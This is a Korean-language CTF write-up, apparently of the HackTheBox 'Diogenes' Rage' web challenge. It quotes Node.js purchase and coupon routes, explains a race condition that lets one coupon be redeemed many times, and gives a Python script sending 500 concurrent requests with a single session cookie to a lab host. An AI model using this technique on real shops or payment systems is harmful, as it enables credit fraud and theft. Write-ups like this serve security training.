# Diogenes' Rage
![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
![js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white)

![image](https://github.com/user-attachments/assets/e2610c44-cf49-409a-bd0f-cfb7b559582b)
- 처음 접속시 렌더링되는 자판기 페이지
- 쿠폰을 넣으면 1$가 충전되고, 13$인 ```C8``` 물품을 구매하면 플래그를 획득
- 딱봐도 ```Race Condition``` 문제임을 유추할수있다.

## Source Code Analysis
```
router.post('/api/purchase', AuthMiddleware, async (req, res) => {
    return db.getUser(req.data.username)
        .then(async user => {
            if (user === undefined) {
                await db.registerUser(req.data.username);
                user = { username: req.data.username, balance: 0.00, coupons: '' };
            }

            const { item } = req.body;

            if (item) {
                return db.getProduct(item)
                    .then(product => {
                        if (product == undefined) {
                            return res.send(response("Invalid item code supplied!"));
                        }

                        if (product.price <= user.balance) {
                            const newBalance = parseFloat(user.balance - product.price).toFixed(2);
                            return db.setBalance(req.data.username, newBalance)
                                .then(() => {
                                    if (product.item_name == 'C8') {
                                        return res.json({
                                            flag: fs.readFileSync('/app/flag').toString(),
                                            message: `Thank you for your order! $${newBalance} coupon credits left!`
                                        });
                                    }

                                    res.send(response(`Thank you for your order! $${newBalance} coupon credits left!`));
                                });
                        }

                        return res.status(403).send(response("Insufficient balance!"));
                    });
            }
        });
});
```
- 물건을 구매하는 엔드포인트 함수
- 단일 스레드로 동작하는 ```node.js```의 경우 ```async```를 사용하여 요청을 비동기로 처리하는 경우가 많다.
- 위 함수 또한 ```async``` 키워드가 붙어 비동기적으로 동작하게 되고, 이 경우 ```Race Condition```이 발생한다.

```
router.post('/api/coupons/apply', AuthMiddleware, async (req, res) => {
    return db.getUser(req.data.username)
        .then(async user => {
            if (user === undefined) {
                await db.registerUser(req.data.username);
                user = { username: req.data.username, balance: 0.00, coupons: '' };
            }

            const { coupon_code } = req.body;

            if (coupon_code) {
                if (user.coupons.includes(coupon_code)) {
                    return res.status(401).send(response("This coupon is already redeemed!"));
                }

                return db.getCouponValue(coupon_code)
                    .then(coupon => {
                        if (coupon) {
                            return db.addBalance(user.username, coupon.value)
                                .then(() => {
                                    db.setCoupon(user.username, coupon_code)
                                        .then(() => res.send(response(`$${coupon.value} coupon redeemed successfully!`)))
                                        .catch(() => res.send(response("Failed to redeem the coupon!")));
                                });
                        }

                        res.send(response("No such coupon exists!"));
                    });
            }

            return res.status(401).send(response("Missing required parameters!"));
        });
});

router.get('/api/reset', async (req, res) => {
    res.clearCookie('session');
    res.send(response("Insert coins below!"));
});
```
- 쿠폰을 발급하는 엔드포인트 ```/api/coupons/apply```, 세션을 리셋하는 엔드포인트 ```/api/reset```의 각 동작은 위 코드와 같다.
- 물건을 구매(```/api/purchase```)할 때 뿐만 아니라 쿠폰을 발급 받을 때(```/api/coupons/apply```)도 ```registerUser()```가 호출된다는것을 확인 가능
- 쿠폰을 발급받을 때 사용자 세션이 존재한다면 별도로 ```registerUser()```하지않는다 이후 쿠폰을 가져와 쿠폰에 적힌 값만큼 ```adBalance()```한다

## PoC
![image](https://github.com/user-attachments/assets/b0e3fde5-e133-4b33-be44-2401e5905d2f)
- 세션값이 없을때 자동으로 세션값을 할당받아와 해당 세션값을 사용하고 공격한다.

```
import concurrent.futures
import requests
import json
import time

URL = "http://167.99.82.136:32232/api/coupons/apply"
HEADER = {'Content-Type': 'application/json'}
DATA = {"coupon_code": "HTB_100"}

COOKIES = {
    'session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyXzNkNjIzMmQ5MWMiLCJpYXQiOjE3MDU2NDEyMDB9'
}

def send_request():
    response = requests.post(URL, headers=HEADER, data=json.dumps(DATA), cookies=COOKIES)
    return response.json()

def main():
    num_requests = 500
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(send_request) for _ in range(num_requests)]
        concurrent.futures.wait(futures)
        results = [future.result() for future in futures]

        for result in results:
            print(result)

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Total time: {end_time - start_time} seconds")
```
- 해당 코드로 요청을 보낸후 공격에 사용된 세션을 사용하여 플래그 구매

![image](https://github.com/user-attachments/assets/dc33ba40-1837-4d78-878a-e223eb177af6)



